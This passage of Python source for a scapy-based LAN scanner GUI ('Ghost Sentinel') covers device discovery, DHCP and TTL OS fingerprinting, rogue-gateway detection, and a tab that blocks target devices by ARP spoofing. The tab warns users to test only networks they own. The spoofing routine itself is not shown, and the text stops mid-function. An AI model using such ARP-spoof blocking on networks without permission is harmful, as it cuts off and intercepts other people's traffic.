import customtkinter as ctk
import time
import tkinter as tk
from tkinter import ttk
import threading
import json
import os
import sys
import subprocess
import ctypes
import platform
from scapy.all import arping, Ether, ARP, IP, ICMP, sr1, conf, sniff, sendp, get_if_list, get_if_addr
import socket
import requests

conf.verb = 0

# ── Colour palette ─────────────────────────────────────────────────────────
# All UI colours are defined here once so they stay harmonious throughout.
_C = {
    # Backgrounds
    'bg_deep':    '#0d1117',   # root / window background
    'bg_panel':   '#161b27',   # cards, frames
    'bg_input':   '#1c2333',   # entry fields, dropdowns
    # Accents
    'accent':     '#3b82f6',   # primary blue — buttons, active states
    'accent_h':   '#2563eb',   # hover on primary blue
    'success':    '#22c55e',   # online / yes / unblock
    'success_h':  '#16a34a',   # hover on green
    'danger':     '#ef4444',   # block / high threat / no-exit
    'danger_h':   '#dc2626',   # hover on red
    'warn':       '#f59e0b',   # warning / blocked / medium threat
    # Text
    'text_pri':   '#e2e8f0',   # primary text
    'text_muted': '#64748b',   # secondary / hint text
    # Treeview rows
    'row_online':  '#14532d',  # dark green row
    'row_offline': '#1e1e2e',  # near-black row
    'row_blocked': '#78350f',  # dark amber row
    # Threat rows (insights treeview)
    'threat_high':   '#7f1d1d',  # dark red
    'threat_medium': '#78350f',  # dark amber
    'threat_low':    '#1e3a5f',  # dark blue
    # Legend dots (must be bright enough to read against dark bg)
    'dot_high':   '#f87171',
    'dot_medium': '#fbbf24',
    'dot_low':    '#60a5fa',
    # Treeview widget chrome
    'tree_bg':      '#0d1117',
    'tree_fg':      '#e2e8f0',
    'tree_sel_bg':  '#1d4ed8',
    'tree_sel_fg':  '#ffffff',
    'tree_heading': '#1c2333',
    'tree_heading_fg': '#94a3b8',
}

# ── Network interface helpers ──────────────────────────────────────────────

def _detect_gateway_interface() -> str:
    """
    Return the interface name that carries the default route.
    Works on Linux (reads /proc/net/route), macOS/BSD (runs 'route -n get default'),
    and Windows (uses socket to probe the gateway-bound interface).
    Falls back to scapy's conf.iface if nothing else works.
    """
    system = platform.system()

    # ── Linux ─────────────────────────────────────────────────────────────
    if system == "Linux":
        try:
            with open("/proc/net/route") as fh:
                for line in fh:
                    parts = line.strip().split()
                    # Destination == 00000000 means default route
                    if len(parts) >= 8 and parts[1] == "00000000":
                        return parts[0]          # interface name (e.g. eth0, wlan0)
        except Exception:
            pass

    # ── macOS / BSD ───────────────────────────────────────────────────────
    if system == "Darwin":
        try:
            out = subprocess.check_output(
                ["route", "-n", "get", "default"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
            for line in out.splitlines():
                if "interface:" in line:
                    return line.split(":")[-1].strip()
        except Exception:
            pass

    # ── Windows ───────────────────────────────────────────────────────────
    if system == "Windows":
        try:
            # Connect a UDP socket to an external IP; the OS chooses the right
            # source interface without actually sending anything.
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            # Match the local IP to a scapy interface name
            for iface in get_if_list():
                try:
                    if get_if_addr(iface) == local_ip:
                        return iface
                except Exception:
                    continue
        except Exception:
            pass

    # ── Universal fallback — probe via UDP socket ─────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        for iface in get_if_list():
            try:
                if get_if_addr(iface) == local_ip:
                    return iface
            except Exception:
                continue
    except Exception:
        pass

    # ── Last resort ───────────────────────────────────────────────────────
    return str(conf.iface)


def _list_interfaces() -> list:
    """
    Return a sorted list of (name, ip, label) tuples for every non-loopback
    interface that scapy can see. label is the string shown in the UI dropdown.
    """
    results = []
    gw_iface = _detect_gateway_interface()
    for iface in get_if_list():
        if iface in ("lo", "lo0"):
            continue
        try:
            ip = get_if_addr(iface)
        except Exception:
            ip = "?.?.?.?"
        marker = "  ★ (default)" if iface == gw_iface else ""
        label  = f"{iface}  [{ip}]{marker}"
        results.append((iface, ip, label))
    # Put the default gateway interface first
    results.sort(key=lambda t: (0 if t[0] == gw_iface else 1, t[0]))
    return results


# ── Persistence file sits next to the script ──────────────────────────────
SAVE_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "ghost_sentinel_data.json"
)

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

# ── Vendor lookup cache (prevents redundant API calls per session) ─────────
_vendor_cache: dict = {}

# ─── Passive DHCP Fingerprinting ───────────────────────────────────────────

DHCP_FINGERPRINTS = {
    # Apple iOS
    (1, 3, 6, 15, 119, 252):                                    ("iOS", 90),
    (1, 3, 6, 15, 119, 252, 95):                                ("iOS", 88),
    (1, 3, 6, 15, 33, 42, 119, 252):                            ("iOS", 92),
    (1, 3, 6, 15, 33, 42, 121, 249):                            ("iOS", 95),
    (1, 3, 6, 15, 33, 42, 121, 249, 252):                       ("iOS", 97),
    (1, 3, 6, 15, 33, 44, 46, 119, 252):                        ("iOS", 85),
    (1, 121, 3, 6, 15, 119, 252, 95, 44, 46):                   ("iOS", 80),
    # Apple macOS
    (1, 121, 3, 6, 15, 119, 252, 95):                           ("macOS", 90),
    (1, 121, 3, 6, 15, 119, 252, 95, 44, 46):                   ("macOS", 95),
    (1, 121, 3, 6, 15, 119, 252):                               ("macOS", 85),
    # Android
    (1, 3, 6, 15, 26, 28, 51, 58, 59):                         ("Android", 90),
    (1, 3, 6, 15, 26, 28, 51, 58, 59, 43):                     ("Android", 88),
    (1, 3, 6, 28, 51, 15):                                     ("Android", 75),
    (1, 3, 6, 15, 26, 28, 51, 58, 59, 60):                     ("Android 12+", 92),
    (1, 3, 6, 15, 26, 28, 51, 58, 59, 119):                    ("Android", 85),
    # Windows
    (1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252): ("Windows 10/11", 98),
    (1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249):      ("Windows 10", 95),
    (1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121):           ("Windows 8/8.1", 90),
    (1, 15, 3, 6, 44, 46, 47, 31, 33, 121, 249, 43):           ("Windows 7", 90),
    (1, 3, 6, 15, 44, 46, 47, 31, 33, 121, 249, 43):           ("Windows Vista", 85),
    (1, 3, 6, 15, 44, 46, 47):                                 ("Windows XP", 80),
    # Linux
    (1, 3, 6, 12, 15, 28, 40, 41, 42):                         ("Linux", 85),
    (1, 3, 6, 12, 15, 26, 28, 40, 41, 42, 119):                ("Linux (NetworkManager)", 90),
    (1, 28, 2, 3, 15, 6, 12):                                  ("Linux (udhcpc)", 80),
    (1, 3, 6, 12, 15, 28, 40, 41, 42, 119, 121):               ("Linux / Ubuntu", 88),
}

APPLE_MARKER_OPTIONS   = {119, 252, 95}
ANDROID_MARKER_OPTIONS = {26, 28, 58, 59}


def match_dhcp_fingerprint(param_list: tuple):
    if not param_list:
        return None, 0
    param_set = set(param_list)

    if param_list in DHCP_FINGERPRINTS:
        label, confidence = DHCP_FINGERPRINTS[param_list]
        return label, confidence

    has_apple   = bool(param_set & APPLE_MARKER_OPTIONS)
    has_android = bool(param_set & ANDROID_MARKER_OPTIONS)
    if has_apple and not has_android:
        if 95 in param_set or (44 in param_set and 46 in param_set):
            return "macOS", 78
        return "iOS", 75
    if has_android and not has_apple:
        return "Android", 70

    best_label, best_score = None, 0
    for fingerprint, (os_name, fp_conf) in DHCP_FINGERPRINTS.items():
        fp_set  = set(fingerprint)
        overlap = len(param_set & fp_set)
        union   = len(param_set | fp_set)
        score   = (overlap / union if union else 0) * fp_conf
        if score > best_score:
            best_score, best_label = score, os_name

    if best_score >= 40:
        return f"{best_label} (approx)", int(best_score)
    return None, 0


# ── Admin privilege helpers ────────────────────────────────────────────────

def _is_admin() -> bool:
    """Return True if the current process has admin / root privileges."""
    try:
        if platform.system() == "Windows":
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.getuid() == 0   # Linux / macOS
    except Exception:
        return False


def _restart_as_admin():
    """
    Relaunch this script with elevated privileges, then exit the current
    (non-elevated) process.

    Windows : ShellExecuteW with the 'runas' verb triggers the UAC prompt.
    Linux/macOS : re-exec under sudo in the same terminal.
    """
    script = os.path.abspath(sys.argv[0])
    system = platform.system()
    try:
        if system == "Windows":
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}"', None, 1)
        else:
            os.execvp("sudo", ["sudo", sys.executable, script] + sys.argv[1:])
    except Exception as e:
        print(f"[Ghost Sentinel] Could not restart as admin: {e}")
    sys.exit(0)


def _show_privilege_dialog() -> bool:
    """
    Show a small CTk dialog asking whether to restart with admin rights.
    Returns True if the user clicked 'Yes, Restart', False otherwise.
    Must be called BEFORE the main app window is created.
    """
    answer = {"value": False}

    root = ctk.CTk()
    root.withdraw()   # hide the blank root window

    dialog = ctk.CTkToplevel(root)
    dialog.title("Administrator Required")
    dialog.geometry("420x180")
    dialog.resizable(False, False)
    dialog.grab_set()
    dialog.lift()

    ctk.CTkLabel(
        dialog,
        text="⚠  Ghost Sentinel needs administrator privileges\n"
             "to capture raw network packets (scapy / ARP).",
        font=ctk.CTkFont(size=13),
        wraplength=380,
        justify="center",
    ).pack(pady=(22, 10))

    ctk.CTkLabel(
        dialog,
        text="Restart now with elevated permissions?",
        text_color=_C['text_muted'],
        font=ctk.CTkFont(size=11),
    ).pack()

    btn_row = ctk.CTkFrame(dialog, fg_color="transparent")
    btn_row.pack(pady=16)

    def _yes():
        answer["value"] = True
        dialog.destroy()
        root.destroy()

    def _no():
        dialog.destroy()
        root.destroy()

    ctk.CTkButton(btn_row, text="Yes, Restart",
                  fg_color=_C['success'], hover_color=_C['success_h'],
                  width=140, command=_yes).pack(side="left", padx=10)
    ctk.CTkButton(btn_row, text="No, Exit",
                  fg_color=_C['danger'], hover_color=_C['danger_h'],
                  width=140, command=_no).pack(side="left", padx=10)

    root.mainloop()
    return answer["value"]


# ── Apply ttk treeview styles ──────────────────────────────────────────────

def _apply_treeview_style():
    """
    Configure a dark ttk.Treeview style to match the palette.
    Called once after the main CTk window is created.
    """
    style = ttk.Style()
    style.theme_use("default")

    style.configure("Treeview",
        background=_C['tree_bg'],
        foreground=_C['tree_fg'],
        fieldbackground=_C['tree_bg'],
        borderwidth=0,
        rowheight=24,
    )
    style.configure("Treeview.Heading",
        background=_C['tree_heading'],
        foreground=_C['tree_heading_fg'],
        relief="flat",
        borderwidth=0,
    )
    style.map("Treeview",
        background=[("selected", _C['tree_sel_bg'])],
        foreground=[("selected", _C['tree_sel_fg'])],
    )
    style.map("Treeview.Heading",
        background=[("active", _C['bg_input'])],
    )


# ───────────────────────────────────────────────────────────────────────────

class NetworkScannerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Ghost Sentinel - Network Scanner")
        self.geometry("1200x620")
        self.configure(fg_color=_C['bg_deep'])
        self.monitoring = False

        # Apply treeview theme after window exists
        _apply_treeview_style()

        # device_first_seen: key → {ip, mac, vendor, hostname, start_time,
        #                            os, os_confidence, status}
        self.device_first_seen: dict = {}

        # Spoof sessions keyed by target_ip.
        # Each entry: {stop_event, thread, status, target_mac,
        #              gateway_ip, gateway_mac}
        self._spoof_sessions: dict = {}

        # Scan wake event (lets continuous_scan sleep be interrupted on demand)
        self._scan_wake = threading.Event()

        # ── Active interface selection (set before monitoring starts) ─────
        # List of interface name strings to pass to scapy sniff / arping.
        # Empty list means "let scapy pick" (equivalent to all interfaces on Linux).
        self._selected_ifaces: list = []

        # ── Scan thread registry ──────────────────────────────────────────
        # Keeps references to every background thread started by
        # start_scanning() so stop_scanning() can join them all cleanly.
        self._scan_threads: list = []

        # A dedicated stop-event shared by all scan threads in one session.
        self._stop_event: threading.Event = threading.Event()

        # ── Gateway-centric bridge / rogue-router detection ──────────────
        # Primary network gateway MAC — learned from ARP traffic.
        self._primary_gw_mac: str = ""
        self._primary_gw_ip:  str = ""

        # bridge_suspects keyed by SUSPECT_MAC (not IP — survives IP changes).
        # Schema per entry:
        #   suspect_mac     : str   — MAC of the device acting as a rogue gateway
        #   known_ips       : set   — all IPs this MAC has used (survives DHCP churn)
        #   forwarded_macs  : set   — MACs of clients seen routing through it
        #   vendor          : str
        #   hostname        : str
        #   ttl_drops       : list  — rolling window of (ttl_obs, ttl_exp) tuples
        #   arp_spoof_count : int   — how many times it answered ARP for a 3rd-party IP
        #   first_seen      : float
        #   last_seen       : float
        #   confidence      : str   — 'Low' | 'Medium' | 'High'
        #   reason          : str
        self.bridge_suspects: dict = {}

        # Load saved data before building UI
        self._load_devices()

        self.tabview = ctk.CTkTabview(self, width=1180, height=580,
                                      fg_color=_C['bg_panel'],
                                      segmented_button_fg_color=_C['bg_input'],
                                      segmented_button_selected_color=_C['accent'],
                                      segmented_button_selected_hover_color=_C['accent_h'],
                                      segmented_button_unselected_color=_C['bg_input'],
                                      segmented_button_unselected_hover_color=_C['bg_panel'])
        self.tabview.pack(fill="both", expand=True, padx=10, pady=10)
        self.tabview.add("Scanner")
        self.tabview.add("Network Control")
        self.tabview.add("Advanced Insights")

        self._build_scanner_tab()
        self._build_network_control_tab()
        self._build_advanced_insights_tab()

        # ── Close-window protocol ─────────────────────────────────────────
        # Intercept the X button so active ARP spoof sessions are always
        # restored before the process exits — no device left blocked.
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    # ══════════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ══════════════════════════════════════════════════════════════════════

    _PERSIST_FIELDS = (
        'ip', 'mac', 'vendor', 'hostname', 'start_time', 'os', 'os_confidence'
    )

    def _save_devices(self):
        """Write device cache + bridge suspects to JSON. Main thread only."""
        try:
            _br_fields = ('suspect_mac', 'known_ips', 'forwarded_macs',
                          'vendor', 'hostname', 'arp_spoof_count',
                          'first_seen', 'last_seen', 'confidence', 'reason',
                          'ttl_drops')
            # Sets are not JSON-serialisable — convert to lists
            serialisable_suspects = {}
            for mac, rec in self.bridge_suspects.items():
                entry = {f: rec[f] for f in _br_fields if f in rec}
                entry['known_ips']      = list(rec.get('known_ips', []))
                entry['forwarded_macs'] = list(rec.get('forwarded_macs', []))
                # ttl_drops is a list of 2-tuples — list of lists serialises fine
                serialisable_suspects[mac] = entry

            payload = {
                'primary_gw_mac': self._primary_gw_mac,
                'primary_gw_ip':  self._primary_gw_ip,
                'devices': {
                    key: {f: data[f] for f in self._PERSIST_FIELDS if f in data}
                    for key, data in self.device_first_seen.items()
                },
                'bridge_suspects': serialisable_suspects,
            }
            with open(SAVE_FILE, "w") as fh:
                json.dump(payload, fh, indent=2)
        except Exception:
            pass

    def _load_devices(self):
        """Read device cache + bridge suspects from JSON on startup."""
        if not os.path.exists(SAVE_FILE):
            return
        try:
            with open(SAVE_FILE) as fh:
                raw = json.load(fh)

            if not isinstance(raw, dict):
                return

            self._primary_gw_mac = raw.get('primary_gw_mac', '')
            self._primary_gw_ip  = raw.get('primary_gw_ip', '')

            # 'devices' section — fall back to flat dict for old format
            devices_raw = raw.get('devices', {})
            for key, data in devices_raw.items():
                if key in ('devices', 'bridge_suspects',
                           'primary_gw_mac', 'primary_gw_ip'):
                    continue
                self.device_first_seen[key] = {
                    'ip':            data.get('ip', ''),
                    'mac':           data.get('mac', ''),
                    'vendor':        data.get('vendor', 'Unknown Vendor'),
                    'hostname':      data.get('hostname', 'Hidden/Unknown'),
                    'start_time':    data.get('start_time', time.time()),
                    'os':            data.get('os', 'Unknown'),
                    'os_confidence': data.get('os_confidence', 0),
                    'status':        'Offline',
                }

            for mac, rec in raw.get('bridge_suspects', {}).items():
                self.bridge_suspects[mac] = {
                    'suspect_mac':     rec.get('suspect_mac', mac),
                    'known_ips':       set(rec.get('known_ips', [])),
                    'forwarded_macs':  set(rec.get('forwarded_macs', [])),
                    'vendor':          rec.get('vendor', 'Unknown Vendor'),
                    'hostname':        rec.get('hostname', 'Hidden/Unknown'),
                    'arp_spoof_count': rec.get('arp_spoof_count', 0),
                    'ttl_drops':       [tuple(x) for x in rec.get('ttl_drops', [])],
                    'first_seen':      rec.get('first_seen', time.time()),
                    'last_seen':       rec.get('last_seen', time.time()),
                    'confidence':      rec.get('confidence', 'Low'),
                    'reason':          rec.get('reason', ''),
                }
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════════════
    # ADVANCED INSIGHTS TAB BUILDER
    # ══════════════════════════════════════════════════════════════════════

    def _build_advanced_insights_tab(self):
        tab = self.tabview.tab("Advanced Insights")

        # ── Header ────────────────────────────────────────────────────────
        ctk.CTkLabel(
            tab,
            text="🌐  Bridge / Rogue Gateway Detection — gateway-centric analysis",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color=_C['text_pri'],
        ).pack(pady=(12, 2))

        ctk.CTkLabel(
            tab,
            text=(
                "Monitors ARP traffic to learn the primary gateway MAC. "
                "Any device whose MAC answers ARP for IPs it doesn't own, "
                "or whose TTL-decremented packets are forwarded to multiple clients, "
                "is flagged as a Bridge / Rogue Gateway. Tracking is MAC-based so "
                "detection survives IP changes (DHCP churn, VMs, mobile hotspots)."
            ),
            text_color=_C['text_muted'],
            font=ctk.CTkFont(size=11),
            wraplength=1120,
        ).pack(pady=(0, 4))

        # ── Gateway info bar ──────────────────────────────────────────────
        gw_bar = ctk.CTkFrame(tab, fg_color="transparent")
        gw_bar.pack(fill="x", padx=12, pady=(0, 4))
        ctk.CTkLabel(gw_bar, text="Primary Gateway:",
                     font=ctk.CTkFont(weight="bold"),
                     text_color=_C['text_pri']).pack(side="left", padx=(4, 6))
        self.gw_info_label = ctk.CTkLabel(
            gw_bar, text="Not yet detected", text_color=_C['text_muted'])
        self.gw_info_label.pack(side="left")

        # ── Toolbar ───────────────────────────────────────────────────────
        toolbar = ctk.CTkFrame(tab, fg_color="transparent")
        toolbar.pack(fill="x", padx=10)

        self.insights_status = ctk.CTkLabel(
            toolbar, text="Waiting for monitoring to start…",
            text_color=_C['text_muted'])
        self.insights_status.pack(side="left", padx=10)

        ctk.CTkButton(
            toolbar, text="🗑  Clear List", width=110,
            fg_color=_C['bg_input'], hover_color=_C['bg_panel'],
            text_color=_C['text_pri'],
            command=self._clear_bridge_suspects,
        ).pack(side="right", padx=10)

        # ── Treeview ──────────────────────────────────────────────────────
        tree_frame = ctk.CTkFrame(tab, fg_color="transparent")
        tree_frame.pack(fill="both", expand=True, padx=10, pady=5)

        self.insights_tree = ttk.Treeview(
            tree_frame,
            columns=("MAC", "Known IPs", "Hostname", "Vendor",
                     "Clients", "ARP Spoof#", "TTL Drops",
                     "Confidence", "Reason", "Last Seen"),
            show="headings",
            style="Treeview",
        )
        for col, label, width in [
            ("MAC",        "Suspect MAC",    140),
            ("Known IPs",  "Known IPs",      180),
            ("Hostname",   "Hostname",        150),
            ("Vendor",     "Vendor",          130),
            ("Clients",    "Clients Behind",   90),
            ("ARP Spoof#", "ARP Spoofs",       80),
            ("TTL Drops",  "TTL Drops",        75),
            ("Confidence", "Confidence",       90),
            ("Reason",     "Reason",          200),
            ("Last Seen",  "Last Seen",       130),
        ]:
            self.insights_tree.heading(col, text=label)
            self.insights_tree.column(col, width=width)

        self.insights_tree.tag_configure('high',   background=_C['threat_high'],   foreground=_C['tree_fg'])
        self.insights_tree.tag_configure('medium', background=_C['threat_medium'], foreground=_C['tree_fg'])
        self.insights_tree.tag_configure('low',    background=_C['threat_low'],    foreground=_C['tree_fg'])

        sb = ttk.Scrollbar(tree_frame, orient="vertical",
                           command=self.insights_tree.yview)
        self.insights_tree.configure(yscrollcommand=sb.set)
        self.insights_tree.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")

        # ── Legend ────────────────────────────────────────────────────────
        leg = ctk.CTkFrame(tab, fg_color="transparent")
        leg.pack(fill="x", padx=12, pady=(0, 6))
        for colour, lbl in (
            (_C['dot_high'],   "High — ARP spoofing confirmed OR forwarding 3+ clients"),
            (_C['dot_medium'], "Medium — TTL drop observed 3+ times"),
            (_C['dot_low'],    "Low   — single observation"),
        ):
            tk.Label(leg, text="●", fg=colour,
                     bg=_C['bg_deep'], font=("Arial", 14)).pack(side="left", padx=(6, 2))
            ctk.CTkLabel(leg, text=lbl,
                         text_color=_C['text_muted'],
                         font=ctk.CTkFont(size=11)).pack(side="left", padx=(0, 18))

    # ══════════════════════════════════════════════════════════════════════
    # TAB BUILDERS
    # ══════════════════════════════════════════════════════════════════════

    def _build_scanner_tab(self):
        tab = self.tabview.tab("Scanner")

        top = ctk.CTkFrame(tab, fg_color="transparent")
        top.pack(fill="x", pady=(5, 0))
        ctk.CTkLabel(top, text="Target Network (e.g. 192.168.1.0/24):",
                     text_color=_C['text_pri']).pack(
            side="left", padx=(10, 5))
        self.network_entry = ctk.CTkEntry(top, width=220,
                                          fg_color=_C['bg_input'],
                                          border_color=_C['accent'],
                                          text_color=_C['text_pri'])
        self.network_entry.pack(side="left", padx=5)
        self.network_entry.insert(0, "192.168.1.0/24")
        self.refresh_button = ctk.CTkButton(
            top, text="▶  Start Monitoring",
            fg_color=_C['accent'], hover_color=_C['accent_h'],
            text_color=_C['text_pri'],
            command=self._start_or_refresh)
        self.refresh_button.pack(side="left", padx=10)

        # Export button
        self.export_button = ctk.CTkButton(
            top, text="💾  Export CSV", width=120,
            fg_color=_C['bg_input'], hover_color=_C['bg_panel'],
            text_color=_C['text_pri'],
            command=self._export_csv)
        self.export_button.pack(side="left", padx=5)

        # Interface selector row
        self._build_iface_row(tab)

        tree_frame = ctk.CTkFrame(tab, fg_color="transparent")
        tree_frame.pack(fill="both", expand=True, padx=10, pady=5)

        self.tree = ttk.Treeview(
            tree_frame,
            columns=("IP", "MAC", "Hostname", "Vendor", "OS", "Status", "Uptime"),
            show="headings",
            style="Treeview",
        )
        for col, label, width in [
            ("IP",       "IP Address",       120),
            ("MAC",      "MAC Address",       140),
            ("Hostname", "Device Name",       160),
            ("Vendor",   "Brand / Vendor",    150),
            ("OS",       "Operating System",  200),
            ("Status",   "Status",             80),
            ("Uptime",   "Uptime (HH:MM:SS)", 120),
        ]:
            self.tree.heading(col, text=label)
            self.tree.column(col, width=width)

        self.tree.tag_configure('online',  background=_C['row_online'],  foreground=_C['tree_fg'])
        self.tree.tag_configure('offline', background=_C['row_offline'], foreground=_C['text_muted'])
        self.tree.tag_configure('blocked', background=_C['row_blocked'], foreground=_C['tree_fg'])

        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.status_label = ctk.CTkLabel(tab, text="Ready",
                                         text_color=_C['text_muted'])
        self.status_label.pack(pady=(0, 5))

    def _start_or_refresh(self):
        """
        Button callback: first press starts monitoring, subsequent presses
        trigger a clean refresh (stop + restart) on the current settings.
        """
        if self.monitoring:
            self.refresh_scan()
        else:
            self.start_scanning()

    def _build_iface_row(self, parent):
        """
        Interface selector row. Shows a dropdown populated by _list_interfaces().
        The default-gateway interface is pre-selected.
        """
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=10, pady=(0, 4))

        ctk.CTkLabel(row, text="Network Interface(s):",
                     text_color=_C['text_pri']).pack(
            side="left", padx=(10, 6))

        self._iface_list = _list_interfaces()
        iface_labels = [t[2] for t in self._iface_list]

        if not iface_labels:
            iface_labels = ["No interfaces found"]

        self._iface_var = tk.StringVar(value=iface_labels[0])
        self._iface_menu = ctk.CTkOptionMenu(
            row,
            variable=self._iface_var,
            values=iface_labels,
            width=340,
            fg_color=_C['bg_input'],
            button_color=_C['accent'],
            button_hover_color=_C['accent_h'],
            text_color=_C['text_pri'],
            command=self._on_iface_changed,
        )
        self._iface_menu.pack(side="left", padx=4)

        ctk.CTkButton(
            row, text="⟳  Refresh", width=90,
            fg_color=_C['bg_input'], hover_color=_C['bg_panel'],
            text_color=_C['text_pri'],
            command=self._refresh_iface_list,
        ).pack(side="left", padx=4)

        self._iface_info = ctk.CTkLabel(
            row, text="", text_color=_C['text_muted'], font=ctk.CTkFont(size=11))
        self._iface_info.pack(side="left", padx=8)

        # Apply initial selection
        self._on_iface_changed(iface_labels[0])

    def _on_iface_changed(self, label: str):
        """
        Called whenever the user picks a different interface from the dropdown.
        If monitoring is already active, triggers a clean stop → restart so
        the new interface takes effect immediately without zombie threads.
        """
        match = next((t for t in self._iface_list if t[2] == label), None)
        if match:
            self._selected_ifaces = [match[0]]
            self._iface_info.configure(
                text=f"IP: {match[1]}  |  iface: {match[0]}")
        else:
            self._selected_ifaces = []
            self._iface_info.configure(text="")

        # Auto-restart if a session is already running
        if self.monitoring:
            self.refresh_scan()

    def _refresh_iface_list(self):
        """Re-scan available interfaces and rebuild the dropdown."""
        self._iface_list = _list_interfaces()
        labels = [t[2] for t in self._iface_list] or ["No interfaces found"]
        self._iface_menu.configure(values=labels)
        self._iface_var.set(labels[0])
        self._on_iface_changed(labels[0])

    def _build_network_control_tab(self):
        tab = self.tabview.tab("Network Control")

        ctk.CTkLabel(
            tab,
            text="⚠  ARP Spoofing intercepts traffic. Use only on networks you own or have permission to test.",
            text_color=_C['warn'],
            font=ctk.CTkFont(size=12, weight="bold"),
        ).pack(pady=(14, 4))

        card = ctk.CTkFrame(tab, fg_color=_C['bg_panel'])
        card.pack(padx=30, pady=10, fill="x")

        row1 = ctk.CTkFrame(card, fg_color="transparent")
        row1.pack(fill="x", padx=20, pady=(15, 5))
        ctk.CTkLabel(row1, text="Target IP:", width=100, anchor="w",
                     text_color=_C['text_pri']).pack(side="left")
        self.target_ip_entry = ctk.CTkEntry(
            row1, width=200, placeholder_text="e.g. 192.168.1.50",
            fg_color=_C['bg_input'], border_color=_C['accent'],
            text_color=_C['text_pri'])
        self.target_ip_entry.pack(side="left", padx=(0, 20))
        ctk.CTkLabel(row1, text="Device to block",
                     text_color=_C['text_muted']).pack(side="left")

        row2 = ctk.CTkFrame(card, fg_color="transparent")
        row2.pack(fill="x", padx=20, pady=(5, 15))
        ctk.CTkLabel(row2, text="Gateway IP:", width=100, anchor="w",
                     text_color=_C['text_pri']).pack(side="left")
        self.gateway_ip_entry = ctk.CTkEntry(
            row2, width=200, placeholder_text="e.g. 192.168.1.1",
            fg_color=_C['bg_input'], border_color=_C['accent'],
            text_color=_C['text_pri'])
        self.gateway_ip_entry.pack(side="left", padx=(0, 20))
        ctk.CTkLabel(row2, text="Your router / default gateway",
                     text_color=_C['text_muted']).pack(side="left")

        btn_row = ctk.CTkFrame(tab, fg_color="transparent")
        btn_row.pack(pady=10)

        self.block_button = ctk.CTkButton(
            btn_row, text="🚫  Block Device",
            fg_color=_C['danger'], hover_color=_C['danger_h'],
            text_color=_C['text_pri'],
            width=160, command=self.start_block,
        )
        self.block_button.pack(side="left", padx=15)

        self.unblock_button = ctk.CTkButton(
            btn_row, text="✅  Unblock Device",
            fg_color=_C['success'], hover_color=_C['success_h'],
            text_color=_C['text_pri'],
            width=160, command=self.stop_block,
        )
        self.unblock_button.pack(side="left", padx=15)

        ctk.CTkLabel(tab, text="Activity Log:", anchor="w",
                     text_color=_C['text_pri']).pack(anchor="w", padx=30)
        self.spoof_log = ctk.CTkTextbox(tab, height=210, state="disabled",
                                        fg_color=_C['bg_input'],
                                        text_color=_C['text_pri'])
        self.spoof_log.pack(fill="x", padx=30, pady=(0, 10))

    # ══════════════════════════════════════════════════════════════════════
    # EXPORT
    # ══════════════════════════════════════════════════════════════════════

    def _export_csv(self):
        """Save current scan results to ghost_sentinel_export.csv next to script."""
        try:
            out = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "ghost_sentinel_export.csv",
            )
            with open(out, "w") as f:
                f.write("IP,MAC,Hostname,Vendor,OS,Status,Uptime\n")
                for data in self.device_first_seen.values():
                    uptime = self.calculate_uptime(data['start_time'])
                    # Wrap fields in quotes to handle commas in vendor/hostname
                    row = (
                        f"\"{data['ip']}\",\"{data['mac']}\",\"{data['hostname']}\","
                        f"\"{data['vendor']}\",\"{data['os']}\",\"{data['status']}\",\"{uptime}\"\n"
                    )
                    f.write(row)
            self.status_label.configure(text=f"Exported to {out}")
        except Exception as e:
            self.status_label.configure(text=f"Export failed: {e}")

    # ══════════════════════════════════════════════════════════════════════
    # SCANNER HELPERS
    # ══════════════════════════════════════════════════════════════════════

    def is_private_mac(self, mac: str) -> bool:
        """Return True if the MAC address has the locally-administered bit set."""
        if not mac:
            return False
        try:
            return (int(mac.upper().split(":")[0], 16) & 0b10) != 0
        except Exception:
            return False

    def detect_os(self, ip: str, vendor: str, hostname: str, mac: str) -> str:
        """
        Best-effort OS detection using hostname keywords, vendor OUI,
        and ICMP TTL probing.

        For devices with randomised (private) MACs — common on Android 10+
        and iOS 14+ — we skip the early-return and always fall through to
        the ICMP TTL probe so we get a real answer instead of leaving the
        device stuck on 'Unknown (awaiting DHCP)' forever.
        The DHCP sniffer will later upgrade the label if it catches a
        DISCOVER/REQUEST with a higher-confidence fingerprint.
        """
        try:
            # ── Hostname keyword hints ────────────────────────────────────
            for kw in ('Samsung', 'Galaxy', 'Redmi', 'Xiaomi', 'Android'):
                if kw.lower() in hostname.lower():
                    return "Android"

            # ── Gateway shortcut ──────────────────────────────────────────
            if ip.endswith(".1"):
                return "Router / Gateway"

            # ── Vendor OUI hints (only for non-private MACs) ──────────────
            if not self.is_private_mac(mac):
                if "Apple" in vendor:
                    return "iOS / macOS"
                if vendor in ("Samsung", "Xiaomi", "Huawei"):
                    return "Android"
                if any(x in vendor for x in ("Intel", "Dell", "HP", "Lenovo", "ASUS")):
                    return "Windows / Linux"

            # ── ICMP TTL probe ────────────────────────────────────────────
            # Used for ALL devices, including private-MAC mobiles.
            # TTL ≤ 64  → Linux / Android / iOS  (default TTL = 64)
            # TTL ≤ 128 → Windows               (default TTL = 128)
